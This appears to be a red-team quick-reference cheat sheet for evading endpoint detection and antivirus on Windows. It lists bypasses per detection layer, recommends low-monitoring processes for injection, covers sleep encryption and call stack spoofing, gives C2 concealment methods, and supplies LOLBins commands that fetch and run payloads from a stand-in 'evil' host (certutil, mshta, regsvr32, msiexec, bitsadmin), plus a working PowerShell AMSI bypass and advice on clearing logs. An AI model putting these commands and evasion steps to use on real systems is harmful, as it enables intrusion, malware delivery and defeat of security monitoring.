# EDR/AV Bypass and Covert Operations Quick Reference

> Source: Summary of multiple red team field experiences (2024-2026)
> Applicable scenarios: Reference when operations need to be performed in environments with EDR/AV protection

---

## Detection Layers and Corresponding Bypasses

| Detection Layer | What EDR Does | Bypass Approach |
|--------|-----------|---------|
| Static signatures | Matches known malicious file hashes/signatures | Custom compilation, encrypted payload, signature modification |
| User-mode hooks | Hooks ntdll.dll to monitor API calls | Direct syscalls / Unhooking / Bring your own ntdll |
| Kernel callbacks | Registers process/thread/image load callbacks | Callback removal (requires driver) / Injection into legitimate processes |
| ETW | Collects events via ETW | Patch EtwEventWrite / Disable providers |
| Behavioral analysis | Analyzes call sequences and behavior patterns | Delayed execution / Scattered operations / Mimic normal behavior |
| Memory scanning | Periodically scans process memory | Heap encryption / Encrypt payload during sleep / Module stomping |
| Network detection | Analyzes outbound traffic characteristics | Domain fronting / Tunneling through legitimate services / Encryption |

---

## Practical Bypass Techniques

### 1. Direct Syscalls (Bypass user-mode hooks)

```
Principle: Call the kernel directly using the syscall instruction, without going through ntdll.dll
Tools: SysWhispers3 / HellsGate / TartarusGate
Effect: Bypasses all user-mode hooks
```

### 2. Unhooking (Restore original ntdll)

```
Method A: Remap ntdll.dll from disk
Method B: Load a clean copy from the KnownDlls directory
Method C: Copy the .text section from a suspended process
Effect: Restores hooked APIs to their original state
```

### 3. Process Injection (Choose low-monitoring targets)

```
Recommended injection targets (low monitoring):
- RuntimeBroker.exe
- sihost.exe
- taskhostw.exe
- explorer.exe (slightly higher risk)

Avoid injecting into:
- lsass.exe (heavily monitored)
- svchost.exe (a focus for some EDRs)
- powershell.exe / cmd.exe
```

### 4. Module Stomping

```
Principle: Write the payload into the .text section of an already-loaded legitimate DLL
Effect: Memory scans see a legitimate module instead of suspicious RWX memory
```

### 5. Sleep Encryption (Ekko/Zilean)

```
Principle: Encrypt your own memory while the beacon sleeps
Effect: Payload signatures cannot be found during memory scans
Implementation: Register a Timer callback, encrypt before sleep, decrypt after wake
```

### 6. Call Stack Spoofing

```
Principle: Forge the call stack so API calls appear to originate from legitimate code
Effect: Bypasses call-stack-based behavioral detection
```

---

## C2 Traffic Concealment

| Technique | Principle | Detection Difficulty |
|------|------|---------|
| Domain fronting | SNI and Host header differ in HTTPS requests | High |
| Cloudflare Workers | Relay through CF, appears as normal HTTPS | High |
| Azure/AWS legitimate services | Use cloud service APIs as C2 channels | Very high |
| DNS over HTTPS | C2 data encoded in DNS queries | Medium |
| WebSocket | Long-lived connections, blended into normal web traffic | Medium |
| ICMP tunnel | Data hidden in ICMP packets | Low (easily detected) |

---

## LOLBins (Living Off the Land)

Using built-in legitimate system programs to perform malicious actions:

| Program | Purpose | Command Example |
|------|------|---------|
| certutil | Download files | `certutil -urlcache -split -f http://evil/payload.exe` |
| mshta | Execute HTA | `mshta http://evil/payload.hta` |
| rundll32 | Load DLL | `rundll32 evil.dll,EntryPoint` |
| regsvr32 | Load SCT | `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` |
| wmic | Remote execution | `wmic /node:target process call create "cmd"` |
| msiexec | Install MSI | `msiexec /q /i http://evil/payload.msi` |
| bitsadmin | Download files | `bitsadmin /transfer job http://evil/payload.exe C:\payload.exe` |
| forfiles | Execute commands | `forfiles /p c:\windows /m notepad.exe /c "cmd /c calc.exe"` |

---

## AMSI Bypass (PowerShell)

```powershell
# Classic patch (may be detected by signatures)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Stealthier approach: reflectively patch AmsiScanBuffer
# Or downgrade PowerShell to v2 (no AMSI)
powershell -version 2
```

---

## Operational Security (OpSec) Principles

1. **Principle of least action** — Don't touch what you don't need to, don't create new credentials when existing ones can be used
2. **Time window** — Operate during the target's non-working hours (reduces the chance of manual review)
3. **Traffic blending** — Match C2 communication frequency and size to normal business traffic
4. **No tooling on disk** — Execute in memory, clean up after use
5. **Log awareness** — Know what logs each operation generates, avoid them in advance or clean up afterward
6. **Honeypot identification** — Identify honeypots before operating (anomalously open services, overly enticing credentials)
7. **Staged operations** — Don't complete all steps at once; spread them across multiple time periods